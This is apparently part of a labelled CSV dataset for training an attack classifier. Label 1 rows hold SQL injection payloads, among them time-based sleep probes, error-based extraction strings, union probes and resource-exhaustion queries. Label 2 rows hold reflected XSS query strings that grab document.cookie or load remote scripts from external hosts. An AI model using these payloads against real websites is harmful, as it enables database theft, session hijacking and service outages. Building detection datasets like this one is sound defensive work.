sno,Sentence,Label
4817," ( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 2768 = 2768,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
4818,1 )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) ,1
4819,"1%'  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
4820, select sleep ( 5  )  )  +',1
4821,"1%"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
4822, ( select  ( case when  ( 3950 = 2747 )  then 1 else 1/ ( select 0 )  end  )  )  ,1
4823,"1%' )  union all select null,null,null,null,null#",1
4824,select  ( case when  ( 4755 = 4784 )  then 1 else 4755* ( select 4755 from master..sysdatabases )  end ) --,1
4825,"1"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""jtgs"" like ""jtgs",1
4826,1' )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( 'nqol' = 'nqol,1
4827,"1%'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( '%' = '",1
4828,1' where 6168 = 6168,1
4829,"1'|| ( select 'zvpl' where 5877 = 5877 union all select null,null#",1
4830,"1""  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""nevr"" like ""nevr",1
4831,"-6772""  )  )   or 9323 = 9323#",1
4832,"1"" and  ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp",1
4833,1 where 7452 = 7452 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
4834,"1  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  7200 = 7200",1
4835,"-3769""  )  )   )  union all select 8456#",1
4836,1'+ ( select 'vjoj' where 5348 = 5348,1
4837,"1%'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
4838,1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur,1
4839,-4828%' )  or 8678 = 5745#,1
4840,"1%""  )  )   )  union all select null,null,null,null,null,null,null,null#",1
4841,"1""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""afby"" = ""afby",1
4842,"-7518"" or elt ( 8413 = 3995,3995 )  and ""cpnf"" = ""cpnf",1
4843,"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'yqhk' = 'yqhk",1
4844,"1'|| ( select 'xuou' from dual where 7681 = 7681 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1
4845,"1"" )  and 7533 = 7533 and  ( ""yqzq"" = ""yqzq",1
4846,1  )  )   as vryv where 5600 = 5600,1
4847,"-5013'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +ch",1
4848,"-3441'  )  )   as dxvt where 9291 = 9291 union all select 9291,9291,9291#",1
4849,"1""  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""dqis"" = ""dqis",1
4850,"1 )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 1773 = 1773",1
4851,"1  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
4852,"1""  )  )   union all select null,null,null,null,null,null#",1
4853,1 where 3502 = 3502 order by 1--,1
4854,"1'+ ( select 'ejox' where 2719 = 2719 union all select null,null,null#",1
4855,1%' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
4856,"1'+ ( select inyd where 1668 = 1668 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) +'",1
4857,1' where 7828 = 7828 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
4858,"search_text=""><script>alert(document.cookie)</script>&imageField.x=0&<br/>imageField.y=0",2
4859,catId=''></script><script>alert(document.cookie)</scri<br/>pt>''><h1>djsedat%20Narcoticxs</h1>,2
4860,b4yc_day_details=''></script><script>al<br/>ert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4861,a=100&h=''></script><script>alert(document.cookie)</script>''><h1>d<br/>jsedat%20Narcoticxs</h1>,2
4862,sayfa=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat%20Narcoticxs</h1>,2
4863,action=%22%3E'%3E%3CSCRIP<br/>T%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4864,q=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat%20Narcoticxs</h1>,2
4865,sid=''></script><script>alert(document.cookie)</script>''><h1>d<br/>jsedat%20Narcoticxs</h1>,2
4866,"p=mcroyaldeluxe""><script<br/>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js></script>",2
4867,country=corporate&start=430&lang=&entry=mortgage+con<br/>...&sites=''></script><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4868,cal_cdn=%22%3E'%3E%3CSCRIPT%20SRC=ht<br/>tp://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4869,sid=''></script><script>alert(document.cookie)</script>''><h<br/>1>djsedat%20Narcoticxs</h1>,2
4870,"BOT_APLICAR=1&APLICO=1""><script<br/>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js></script>&IDPOST=53&NPAG=1",2
4871,as_eq=-inurl%3Apopup+-inurl%3Aillustration+-intitle%3Aphoto&q=%22+onmous<br/>eover%3D%22window.document.location%3D%27http%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.<br/>org.html%27%22&btnG=recherche&getfields=*&sort=date%3AD%3AL%3Ad1&output=xml_no_dtd&ie=utf8&mode=html<br/>&lr=lang_fr&client=default_frontend&site=main&oe=utf8&proxystylesheet=default_frontend,2
4872,num_conc=%22%3E'%3E%3CSCRIPT%20SRC=<br/>http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4873,MOT=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.n<br/>et%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&x=5&y=11,2
4874,"link=""><script<br/>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js></script>",2
4875,site=f00%3Cscript%3Ealert('xss%20from%20sshja<br/>son')%3C/script%3E&stream=clips/07/02/headoff.wma&type=windows_od,2
4876,u1=http://cyber-unity.com&m1=%3Cscript%3Ea<br/>lert(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=w0LfR4m&m4=%3Ch1%3ESystem%20By<br/>%20XSSED!%3C/h1%3E,2
4877,Page=1&TypeRech=personne&nom=%2<br/>2%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSC<br/>RIPT%3E&Rechercher.x=12&Rechercher.y=10,2
4878,search='></script><script>alert(document.cookie)</scri<br/>pt>''><h1>djsedat%20Narcoticxs</h1>,2
4879,"Veri=""><script>alert('DarkToxic')</script>",2
4880,t=ciao%20pistacchio%22%2F%3E%3Cscript%3Ealert%28%27ciao%2<br/>0pistacchia..visto%20ti%20penso%20sempre!!%27%29%3B%3C%2Fscript%3E%3Ca%3D%22&lbeg=&lend=&serie=3,2
4881,go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3E%20Ownz+Your+<br/>System+%20By+Vagrant%3C/h1%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,2
4882,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(docum<br/>ent.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XSSED!%3<br/>C/h1%3E,2
4883,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert<br/>(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XS<br/>SED!%3C/h1%3E,2
4884,tb_id=19&tb_adi=Fiyat%20&,2
4885,"Type=search&frm_kategori=Haber&frm_text=""><script>alert(document.coo<br/>kie)</script>&sayfa=1&x=0&y=0",2
4886,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(doc<br/>ument.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XSSED!<br/>%3C/h1%3E,2
4887,Index=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xs<br/>sed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4888,u1=http://cyber-unity.com&m1=%3Cscript%3Eal<br/>ert(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%2<br/>0XSSED!%3C/h1%3E,2
4889,stid=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thirdp<br/>arty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4890,file=http://effectiveness63.googlepages.com/canak.html,2
4891,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(<br/>document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XSS<br/>ED!%3C/h1%3E,2
4892,sa='></script><script>alert(document.cookie)</script>''><h1>djs<br/>edat%20Narcoticxs</h1>,2
4893,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(d<br/>ocument.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XSSE<br/>D!%3C/h1%3E,2
4894,go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3E%20Ownz+You<br/>r+System+%20By+Vagrant%3C/h1%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,2
4895,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(do<br/>cument.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20XSSED<br/>!%3C/h1%3E,2
4896,n='></script><script>alert(document.cookie)</scrip<br/>t>''><h1>djsedat%20Narcoticxs</h1>,2
4897,errorType=invalidClientID&clientID='></scri<br/>pt><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>h1,2
4898,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%200<br/>Team');%3C/script%3E,2
4899,c=8&l=39&CFID=94388&CFTOKEN='></script><script>alert(docum<br/>ent.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4900,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity<br/>.Com%22)%3C/script%3E,2
4901,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%200Team')<br/>;%3C/script%3E,2
4902,action=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.<br/>xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,2
4903,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%<br/>2%200Team');%3C/script%3E,2
4904,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Un<br/>ity%2%200Team');%3C/script%3E,2
4905,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity<br/>%2%200Team');%3C/script%3E,2
4906,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-<br/>Unity%2%200Team');%3C/script%3E,2
4907,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity.<br/>Com%22)%3C/script%3E,2
4908,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cybe<br/>r-Unity%2%200Team');%3C/script%3E,2
4909,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity.Com%22<br/>)%3C/script%3E,2
4910,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cybe<br/>r-Unity.Com%22)%3C/script%3E,2
4911,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unit<br/>y.Com%22)%3C/script%3E,2
4912,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Un<br/>ity.Com%22)%3C/script%3E,2
4913,msg=%3Cscript%3Ealert(,2
4914,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2<br/>%200Team');%3C/script%3E,2
4915,user=%3cscript%20src=http://vuln.xssed.net/thirdpart<br/>y/scripts/sshjason.js%3e%3c/script%3e%3cimg%20src=http://images.diaryland.com/diarylandmembersarealo<br/>go.gif%20onload=xss()%3e,2
4916,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity.Com<br/>%22)%3C/script%3E,2
4917,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%200Team<br/>');%3C/script%3E,2
4918,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity.Com%22)%3C/<br/>script%3E,2
4919,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%2<br/>00Team');%3C/script%3E,2
4920,"size=';alert(String.fromChar<br/>Code(83,69,67,85,82,73,84,89,32,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,<br/>83,85,88))//%22;alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.f<br/>romCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(Str<br/>ing.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E%3CBODY%20ONLOAD=alert('XSS')%3E",2
4921,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%200T<br/>eam');%3C/script%3E,2
4922,nil_suggest=btn&ps=&loc=searchbox&tab=web&mode=search&currProv=ask&query=%3C%<br/>2Ftitle%3E%3Cscript%3Ealert%28%27xss+from+sshjason%27%29%3C%2Fscript%3E,2
4923,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyb<br/>er-Unity%2%200Team');%3C/script%3E,2
4924,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%20<br/>0Team');%3C/script%3E,2
4925,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%200<br/>Team');%3C/script%3E,2
4926,pid=163&msg=%3E'%3E%3CScRiPt%20%0a%0d%3Ealert(GURUS)%3B%3C/ScRiPt%3E<br/>%3Cscript+src=%22http://uploaders.4000webs.com/xss.js?,2
4927,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%<br/>2%200Team');%3C/script%3E,2
4928,msg=%3Cscript%3Ealert(%22By%20s3aL||Cyber-Unity%20Team//ww<br/>w.Cyber-Unity.com%22)%3C/script%3E,2
4929,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%<br/>200Team');%3C/script%3E,2
4930,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%20Te<br/>am||System%20XSSED!');%3C/script%3E,2
4931,"fuseaction=classifieds.searchCategory&keyWord=""><h1>MySpace%20X<br/>SS</h1><A%20HREF=""http://www.xssed.com/"">XSS%20(Fake%20myspace.com%20login%20page)<br><img%20src=""ht<br/>tp://img62.imageshack.us/img62/4615/stallowned3hb.jpg""></A><br><input%20type=""text""%20value=""Hexspir<br/>it""%20/><br><marquee>ROTFL!%20LMAO!%20OMG!</marquee>",2
4932,"directpage=%22%3E%3CSCRIPT%3Ealert(String.fromCharCo<br/>de(99,105,115,99,111,32,60,88,83,83,101,100,62,32,5,32,104,101,120,115,112,105,114,105,116))%3C/SCRI<br/>PT%3E%3C?",2
4933,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2<br/>0Team||System%20XSSED!');%3C/script%3E,2
4934,"keywords=%22%3E%3CSCRIPT%3Ealert(String.fro<br/>mCharCode(121,97,104,111,111,32,60,88,83,83,101,100,62,32,5,32,104,101,120,115,112,105,114,105,116))<br/>%3C/SCRIPT%3E%3C?",2
4935,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%200Team');<br/>%3C/script%3E,2
4936,"vidid=';alert(String.fromCharCode(83,69,67,85,82,73,84<br/>,89,32,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(Str<br/>ing.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.fromCharCode(83,69,67,85,8<br/>2,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67<br/>,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E%3CBODY%20ONLOAD=alert('XSS')%3E",2
4937,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%200Team');%3<br/>C/script%3E,2
4938,"threadID=';alert(String.fromCharCode(83,69,67,85,82,73,8<br/>4,89,32,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(St<br/>ring.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.fromCharCode(83,69,67,85,<br/>82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,6<br/>7,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E%3CBODY%20ONLOAD=alert('XSS')%3E",2
4939,comcode='></script><script>alert(document.cookie)</script>'<br/>'><h1>djsedat%20Narcoticxs</h1>,2
4940,u1=http://cyber-unity.com&m1=%3Cscript%3Ealer<br/>t(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20X<br/>SSED!%3C/h1%3E,2
4941,msg=%3Cscript%3Ealert(%22By%20s3aL||Cyb<br/>er-Unity%20Team//www.Cyber-Unity.com%22)%3C/script%3E,2
4942,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Uni<br/>ty.Com%22)%3C/script%3E,2
4943,cat=1&keyword=%22%3E%3Cscript%3Ealert(%22zuppergazi%22)%3C/<br/>script%3E,2
4944,errorType=invalidClientID&client<br/>ID='></script><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>&CFID=2119220&C<br/>FTOKEN=63706826,2
4945,msg=%3Cscript%3Ealert(%22by%20s<br/>3aL%20||Cyber-Unity.Com%22)%3C/script%3E,2
4946,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%20Team||System<br/>');%3C/script%3E,2
4947,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cy<br/>ber-Unity.Com%22)%3C/script%3E,2
4948,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-U<br/>nity.Com%22)%3C/script%3E,2
4949,msg=%3Cscript%3Ealert('By<br/>%20w0LfR4M%20Cyber-Unity%2%200Team');%3C/script%3E,2
4950,u1=http://cyber-unity.com&m1=%3Cscript%3Ealert(d<br/>ocument.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=w0LfR4m&m4=%3Ch1%3ESystem%20By%20XSS<br/>ED!%3C/h1%3E,2
4951,u1=http://cyber-unity.com&m1=%3Cscript%3E<br/>alert(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By<br/>%20XSSED!%3C/h1%3E,2
4952,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-Unity.Com%22)%3<br/>C/script%3E,2
4953,msg=%3Cscript%3Ealert(%22By%20s3aL||Cyber-Unity%20Te<br/>am//www.Cyber-Unity.com%22)%3C/script%3E,2
4954,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cy<br/>ber-Unity%2%200Team');%3C/script%3E,2
4955,u1=http://cyber-unity.com&m1=%3Cscript%3Eale<br/>rt(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%20<br/>XSSED!%3C/h1%3E,2
4956,msg=%3Cscript%3Ealert(%22By%20s3aL||Cyber-Unity%2<br/>0Team//www.Cyber-Unity.com%22)%3C/script%3E,2
4957,msg=%3Cscript%3Ealert('By%20w0LfR4<br/>M%20Cyber-Unity%2%200Team');%3C/script%3E,2
4958,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%20<br/>Team||System%20XSSED!');%3C/script%3E,2
4959,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%200Team');%<br/>3C/script%3E,2
4960,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unit<br/>y%2%200Team');%3C/script%3E,2
4961,msg=%3Cscript%3Ealert(%22by%20s3aL%20||Cyber-<br/>Unity.Com%22)%3C/script%3E,2
4962,msg=%3Cscript%3Ealert(%22by%20s3aL<br/>%20||Cyber-Unity.Com%22)%3C/script%3E,2
4963,msg=%3Cscript%3Ealert('By%20w0LfR4M%20Cyber-Unity%2%<br/>200Team');%3C/script%3E,2
4964,contenttype=%3Cscript%3Ealert(document.cookie)<br/>%3C/script%3E,2
4965,contenttype=%3Cscript%3Ealert(document.cookie)%3C/<br/>script%3E,2
4966,msg=%3Cscript%3Ealert('Ownz+Your+Syst<br/>em+By+Vagrant');%3C/script%3E,2
4967,printerfriendly=yes&resultpage=''></script><script>alert<br/>(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4968,"id=""><script>alert(""Ownz+Your+System+By+Vagrant"")</script>",2
4969,type='%22%3E%3Ch1%3EOwnz%20Your%20System%20By%20Vagrant%3C/h1%3E%<br/>3Cbr%3E%3Cbr%3E%3Cmarquee%3E%20Ownz%20Your%20System%20by%20Vagrant%3C/marque%3E,2
4970,go=Downloads&p=ld&mode=file&val=1%22%3E%3Ch1%3EOwnz+Your+Syste<br/>m+By+Vagrant%3C/h1%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,2
4971,c=0&term=''></script><script>alert(document.cookie)</script>''><h1>djse<br/>dat%20Narcoticxs</h1>,2
4972,msg=%3Cscript%3Ealert('Ownz+Your+System+By+Vagra<br/>nt');%3C/script%3E,2
4973,search=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat%20Narcoticxs</h1>,2
4974,language=''></script><script>alert(document.<br/>cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4975,person=23&criteria=''></script><script>alert(document.cookie)</<br/>script>''><h1>djsedat%20Narcoticxs</h1>,2
4976,msg=%3Cscript%3Ealert('Ownz+Your+System+B<br/>y+Vagrant');%3C/script%3E,2
4977,city=Vail&state=''></script><script>alert(document.cookie)</<br/>script>''><h1>djsedat%20Narcoticxs</h1>,2
4978,u1=http://cyber-unity.com&m1=%3Cscript%3Ea<br/>lert(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1%3ESystem%20By%<br/>20XSSED!%3C/h1%3E,2
4979,action=saform&search=''></script><script><br/>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,2
4980,msg=%3Cscript%3Ealert('Ownz+Your+System+By+Vagrant');%3C/s<br/>cript%3E,2
4981,SearchType=FAQs&PageID=''></script><script>alert(document.cookie)</sc<br/>ript>''><h1>djsedat%20Narcoticxs</h1>,2
4982,u1=http://cyber-unity.com&m1=%3Cscript%3Eale<br/>rt(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=by%20s3aL&m4=%3Ch1%3ESystem%20By<br/>%20XSSED!%3C/h1%3E,2
4983,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%2%200Team')<br/>;%3C/script%3E,2
4984,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity%20Team<br/>||System%20XSSED!');%3C/script%3E,2
4985,msg=%3Cscript%3Ealert('By%20s3aL%20Cyber-Unity<br/>%20Team||www.Cyber-Unity.com');%3C/script%3E,2
4986,u1=http://cyber-unity.com&m<br/>1=%3Cscript%3Ealert(document.cookie)%3C/script%3E&m2=%3Ch1%3ECyber-Unity%3C/h1%3E&m3=bys3aL&m4=%3Ch1<br/>%3ESystem%20By%20XSSED!%3C/h1%3E,2
4987,ClientID='></script><script>alert(document.cookie)<br/></script>''><h1>djsedat%20Narcoticxs</h1>,2
4988,msg=%3Cscript%3Ealert(%22By%20s3aL||Cyber-Unity%20<br/>Team//www.Cyber-Unity.com%22)%3C/script%3E,2
